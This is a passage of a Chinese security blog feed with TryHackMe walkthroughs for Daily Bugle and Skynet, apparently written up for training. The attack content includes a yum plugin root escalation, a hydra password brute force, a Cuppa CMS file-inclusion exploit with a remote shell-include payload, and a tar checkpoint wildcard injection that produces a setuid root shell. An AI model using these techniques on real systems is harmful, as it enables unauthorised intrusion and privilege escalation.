class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[jjameson@dailybugle ~]$ TF=$(<span class="hljs-built_in">mktemp</span> -d)<br>[jjameson@dailybugle ~]$ <span class="hljs-built_in">cat</span> &gt;<span class="hljs-variable">$TF</span>/x&lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&gt; [main]</span><br><span class="hljs-string">&gt; plugins=1</span><br><span class="hljs-string">&gt; pluginpath=$TF</span><br><span class="hljs-string">&gt; pluginconfpath=$TF</span><br><span class="hljs-string">&gt; EOF</span><br>[jjameson@dailybugle ~]$ <span class="hljs-built_in">cat</span> &gt;<span class="hljs-variable">$TF</span>/y.conf&lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&gt; [main]</span><br><span class="hljs-string">&gt; enabled=1</span><br><span class="hljs-string">&gt; EOF</span><br>[jjameson@dailybugle ~]$ <span class="hljs-built_in">cat</span> &gt;<span class="hljs-variable">$TF</span>/y.py&lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&gt; import os</span><br><span class="hljs-string">&gt; import yum</span><br><span class="hljs-string">&gt; from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE</span><br><span class="hljs-string">&gt; requires_api_version=&#x27;2.1&#x27;</span><br><span class="hljs-string">&gt; def init_hook(conduit):</span><br><span class="hljs-string">&gt;   os.execl(&#x27;/bin/sh&#x27;,&#x27;/bin/sh&#x27;)</span><br><span class="hljs-string">&gt; EOF</span><br>[jjameson@dailybugle ~]$ sudo yum -c <span class="hljs-variable">$TF</span>/x --enableplugin=y<br>已加载插件：y<br>没有匹配 y 的插件<br>sh-4.2<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) 组=0(root)<br>sh-4.2<span class="hljs-comment"># cat /root/root.txt</span><br>eec3d53292b1821868266858d7fa6f79<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">TryHackMe靶机记录-Daily Bugle</summary>
    
    
    
    <category term="TryHackMe" scheme="https://cvbxy.github.io/categories/TryHackMe/"/>
    
    
    <category term="TryHackMe" scheme="https://cvbxy.github.io/tags/TryHackMe/"/>
    
    <category term="靶机" scheme="https://cvbxy.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>TryHackMe-Skynet</title>
    <link href="https://cvbxy.github.io/2023/07/22/TryHackMe-Skynet/"/>
    <id>https://cvbxy.github.io/2023/07/22/TryHackMe-Skynet/</id>
    <published>2023-07-22T13:43:16.000Z</published>
    <updated>2023-07-23T09:53:27.651Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>What is Miles password for his emails?</p></blockquote><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br><br>PORT    STATE SERVICE     VERSION<br>80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Skynet<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>110/tcp open  pop3        Dovecot pop3d<br>|_pop3-capabilities: TOP CAPA UIDL RESP-CODES SASL AUTH-RESP-CODE PIPELINING<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>143/tcp open  imap        Dovecot imapd<br>|_imap-capabilities: post-login LITERAL+ LOGIN-REFERRALS more IMAP4rev1 capabilities have listed Pre-login IDLE LOGINDISABLEDA0001 SASL-IR ENABLE OK ID<br>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br><br>Host script results:<br>|_clock-skew: mean: 1h40m06s, deviation: 2h53m24s, median: 0s<br>|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-07-22T12:26:22<br>|_  start_date: N/A<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: skynet<br>|   NetBIOS computer name: SKYNET\x00<br>|   Domain name: \x00<br>|   FQDN: skynet<br>|_  System time: 2023-07-22T07:26:22-05:00<br></code></pre></td></tr></table></figure><p>目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># gobuster dir -u http://10.10.5.188/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span><br>/admin                (Status: 301) [Size: 310] [--&gt; http://10.10.5.188/admin/]<br>/config               (Status: 301) [Size: 311] [--&gt; http://10.10.5.188/config/]<br>/css                  (Status: 301) [Size: 308] [--&gt; http://10.10.5.188/css/]<br>/index.html           (Status: 200) [Size: 523]<br>/js                   (Status: 301) [Size: 307] [--&gt; http://10.10.5.188/js/]<br>/server-status        (Status: 403) [Size: 276]<br>/squirrelmail         (Status: 301) [Size: 317] [--&gt; http://10.10.5.188/squirrelmail/]<br></code></pre></td></tr></table></figure><p>爆破smb服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># enum4linux -a 10.10.5.188</span><br><br>[+] Attempting to map shares on 10.10.5.188<br>//10.10.5.188/print$    Mapping: DENIED Listing: N/A Writing: N/A<br>//10.10.5.188/anonymous Mapping: OK Listing: OK Writing: N/A<br>//10.10.5.188/milesdyson        Mapping: DENIED Listing: N/A Writing: N/A<br>[E] Can<span class="hljs-string">&#x27;t understand response:</span><br><span class="hljs-string">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="hljs-string">//10.10.5.188/IPC$      Mapping: N/A Listing: N/A Writing: N/A</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 有个匿名登录</span><br><span class="hljs-string">┌──(root㉿kali)-[/home/kali]</span><br><span class="hljs-string">└─# smbclient //10.10.5.188/anonymous</span><br><span class="hljs-string">Password for [WORKGROUP\kali]:</span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Fri Nov 27 00:04:00 2020</span><br><span class="hljs-string">  ..                                  D        0  Tue Sep 17 15:20:17 2019</span><br><span class="hljs-string">  attention.txt                       N      163  Wed Sep 18 11:04:59 2019</span><br><span class="hljs-string">  logs                                D        0  Wed Sep 18 12:42:16 2019</span><br><span class="hljs-string"></span><br><span class="hljs-string">                9204224 blocks of size 1024. 5831064 blocks available</span><br><span class="hljs-string">smb: \&gt; get attention.txt</span><br><span class="hljs-string">getting file \attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br><span class="hljs-string">smb: \&gt; cd logs</span><br><span class="hljs-string">smb: \logs\&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Wed Sep 18 12:42:16 2019</span><br><span class="hljs-string">  ..                                  D        0  Fri Nov 27 00:04:00 2020</span><br><span class="hljs-string">  log2.txt                            N        0  Wed Sep 18 12:42:13 2019</span><br><span class="hljs-string">  log1.txt                            N      471  Wed Sep 18 12:41:59 2019</span><br><span class="hljs-string">  log3.txt                            N        0  Wed Sep 18 12:42:16 2019</span><br></code></pre></td></tr></table></figure><p>attention.txt：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">A recent <span class="hljs-keyword">system</span> malfunction has caused various passwords <span class="hljs-keyword">to</span> be changed. <span class="hljs-keyword">All</span> skynet employees are required <span class="hljs-keyword">to</span> change their <span class="hljs-keyword">password</span> <span class="hljs-keyword">after</span> seeing this.<br>-Miles Dyson<br></code></pre></td></tr></table></figure><p>log1.txt：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cyborg007haloterminator<br>terminator22596<br>terminator219<br>terminator20<br>terminator1989<br>terminator1988<br>terminator168<br>terminator16<br>terminator143<br>terminator13<br>terminator123!@#<br>terminator1056<br>terminator101<br>terminator10<br>terminator02<br>terminator00<br>roboterminator<br>pongterminator<br>manasturcaluterminator<br><span class="hljs-keyword">exterminator95</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">exterminator200</span><br><span class="hljs-keyword"></span>dterminator<br>djxterminator<br>dexterminator<br>determinator<br>cyborg007haloterminator<br>avsterminator<br>alonsoterminator<br>Walterminator<br><span class="hljs-number">79</span>terminator6<br><span class="hljs-number">1996</span>terminator<br></code></pre></td></tr></table></figure><p>之前目录扫描有个邮件登录，smb爆破发现一个用户名milesdyson，使用hydra爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># hydra -l milesdyson -P /home/kali/log1.txt 10.10.5.188 http-form-post &quot;/squirrelmail/src/redirect.php:login_username=milesdyson&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:F=Unknown User or password incorrect.&quot;</span><br>[80][http-post-form] host: 10.10.5.188   login: milesdyson   password: cyborg007haloterminator<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/Untitled.png"></p><p>第一封邮件：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">We have changed your smb <span class="hljs-keyword">password</span> <span class="hljs-keyword">after</span> <span class="hljs-keyword">system</span> malfunction.<br><span class="hljs-keyword">Password</span>: )s&#123;A&amp;<span class="hljs-number">2</span>Z=F^n_E.B`<br></code></pre></td></tr></table></figure><p>登录smb：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># smbclient -U milesdyson //10.10.5.188/milesdyson</span><br>Improving Deep Neural Networks.pdf                            N  5743095  Tue Sep 17 17:05:14 2019<br>Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 17:05:14 2019<br>Convolutional Neural Networks-CNN.pdf                         N 19655446  Tue Sep 17 17:05:14 2019<br>notes                                                         D        0  Tue Sep 17 17:18:40 2019<br>Neural Networks and Deep Learning.pdf                         N  4304586  Tue Sep 17 17:05:14 2019<br>Structuring your Machine Learning Project.pdf                 N  3531427  Tue Sep 17 17:05:14 2019<br><br>smb: \&gt; <span class="hljs-built_in">cd</span> notes<br>smb: \notes\&gt; <span class="hljs-built_in">ls</span><br>important.txt                       N      117  Tue Sep 17 17:18:39 2019<br></code></pre></td></tr></table></figure><blockquote><p>What is the hidden directory?</p></blockquote><p>important.txt，发现了一个目录<code>/45kra24zxs28v3yd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. Add features to beta CMS /45kra24zxs28v3yd<br>2. Work on T-800 Model 101 blueprints<br>3. Spend more time with my wife<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/Untitled1.png"></p><p>对二级目录进行目录扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://10.10.5.188/45kra24zxs28v3yd -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt<br>/administrator        (Status: 301) [Size: 335] [--&gt; http://10.10.5.188/45kra24zxs28v3yd/administrator/]<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/Untitled2.png"></p><blockquote><p>What is the vulnerability called when you can include a remote file for malicious purposes?</p></blockquote><p><img src="/img/blogimg/Untitled3.png"></p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Exploit Title   : Cuppa CMS File Inclusion</span><br><span class="hljs-comment"># Date            : 4 June 2013</span><br><span class="hljs-comment"># Exploit Author  : CWH Underground</span><br><span class="hljs-comment"># Site            : www.2600.in.th</span><br><span class="hljs-comment"># Vendor Homepage : http://www.cuppacms.com/</span><br><span class="hljs-comment"># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip</span><br><span class="hljs-comment"># Version         : Beta</span><br><span class="hljs-comment"># Tested on       : Window and Linux</span><br><br>  ,--^----------,--------,-----,-------^--,<br>  | |||||||||   `--------<span class="hljs-string">&#x27;     |          O .. CWH Underground Hacking Team ..</span><br><span class="hljs-string">  `+---------------------------^----------|</span><br><span class="hljs-string">    `\_,-------, _________________________|</span><br><span class="hljs-string">      / XXXXXX /`|     /</span><br><span class="hljs-string">     / XXXXXX /  `\   /</span><br><span class="hljs-string">    / XXXXXX /\______(</span><br><span class="hljs-string">   / XXXXXX /          </span><br><span class="hljs-string">  / XXXXXX /</span><br><span class="hljs-string"> (________(            </span><br><span class="hljs-string">  `------&#x27;</span><br><br><span class="hljs-comment">####################################</span><br>VULNERABILITY: PHP CODE INJECTION<br><span class="hljs-comment">####################################</span><br><br>/alerts/alertConfigField.<span class="hljs-title function_ invoke__">php</span> (<span class="hljs-attr">LINE</span>: <span class="hljs-number">22</span>)<br><br>-----------------------------------------------------------------------------<br>LINE <span class="hljs-number">22</span>: <br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;urlConfig&quot;</span>]); <span class="hljs-meta">?&gt;</span><br>-----------------------------------------------------------------------------<br>    <br><br><span class="hljs-comment">#####################################################</span><br>DESCRIPTION<br><span class="hljs-comment">#####################################################</span><br><br>An attacker might <span class="hljs-keyword">include</span> local <span class="hljs-keyword">or</span> remote PHP files <span class="hljs-keyword">or</span> read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.<br><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]</span><br><br><span class="hljs-comment">#####################################################</span><br>EXPLOIT<br><span class="hljs-comment">#####################################################</span><br><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</span><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br><br>Moreover, We could access Configuration.php source code via PHPStream <br><br>For Example:<br>-----------------------------------------------------------------------------<br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</span><br>-----------------------------------------------------------------------------<br><br>Base64 Encode Output:<br>-----------------------------------------------------------------------------<br>PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+<br>-----------------------------------------------------------------------------<br><br>Base64 Decode Output:<br>-----------------------------------------------------------------------------<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Configuration</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span> = <span class="hljs-string">&quot;cuppa&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;Db@dmin&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$table_prefix</span> = <span class="hljs-string">&quot;cu_&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$administrator_template</span> = <span class="hljs-string">&quot;default&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$list_limit</span> = <span class="hljs-number">25</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span> = <span class="hljs-string">&quot;OBqIPqlFWf3X&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$allowed_extensions</span> = <span class="hljs-string">&quot;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_default_path</span> = <span class="hljs-string">&quot;media/uploadsFiles&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$maximum_file_size</span> = <span class="hljs-string">&quot;5242880&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$secure_login</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$secure_login_value</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$secure_login_redirect</span> = <span class="hljs-string">&quot;&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br>-----------------------------------------------------------------------------<br><br>Able to read sensitive information via File <span class="hljs-title function_ invoke__">Inclusion</span> (PHP Stream)<br><br><span class="hljs-comment">################################################################################################################</span><br> Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD <span class="hljs-variable">$ectors</span>, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 <br><span class="hljs-comment">################################################################################################################</span><br></code></pre></td></tr></table></figure><p>在本机放一个反弹shell的脚本，通过远程文件包含获取shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在浏览器执行</span><br>http://10.10.5.188/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://本机IP/phpshell.php<br></code></pre></td></tr></table></figure><blockquote><p>What is the user flag?</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> user.txt <br>7ce5c2109a40f958099283600a9ae807<br></code></pre></td></tr></table></figure><blockquote><p>What is the root flag?</p></blockquote><p>计划任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/home/milesdyson/backups$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># m h dom mon dow user  command</span><br>*/1 *   * * *   root    /home/milesdyson/backups/backup.sh<br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><br><span class="hljs-comment"># backup.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/html<br>tar cf /home/milesdyson/backups/backup.tgz *<br></code></pre></td></tr></table></figure><blockquote><p>通过<code>tar</code>命令可以利用一个名为<code>–checkpoint</code>的参数，该参数允许在每次归档 X 个文件时（X的默认值为10）显示“进度”消息， <code>–checkpoint</code>还可以与 <code>–checkpoint-action</code> 标志串联使用，<code>–checkpoint-action</code>标志允许在到达检查点（checkpoint）时以二进制或脚本的形式执行某些操作。</p></blockquote><p>在<code>/var/www/html</code>目录下创建一个脚本来提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/var/www/html$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/sroot &amp;&amp; chmod +s /tmp/sroot&quot;</span> &gt; shell.sh<br></code></pre></td></tr></table></figure><p>再创建两个文件用来利用tar执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/var/www/html$ <span class="hljs-built_in">touch</span> <span class="hljs-string">&quot;/var/www/html/--checkpoint=1&quot;</span><br>www-data@skynet:/var/www/html$ <span class="hljs-built_in">touch</span> <span class="hljs-string">&quot;/var/www/html/--checkpoint-action=exec=sh shell.sh&quot;</span><br>www-data@skynet:/tmp$ ./sroot -p<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br>sroot-4.3<span class="hljs-comment"># cat /root/root.txt</span><br>3f0372db24753accc7179a282cd6a949<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">TryHackMe靶机记录-Skynet</summary>
    
    
    
    <category term="TryHackMe" scheme="https://cvbxy.github.io/categories/TryHackMe/"/>
    
    
    <category term="TryHackMe" scheme="https://cvbxy.github.io/tags/TryHackMe/"/>
    
    <category term="靶机" scheme="https://cvbxy.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>github+hexo博客搭建记录</title>
    <link href="https://cvbxy.github.io/2023/06/20/github-hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>https://cvbxy.github.io/2023/06/20/github-hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</id>
    <published>2023-06-20T05:40:27.000Z</published>
    <updated>2023-06-20T06:40:22.366Z</updated>
    
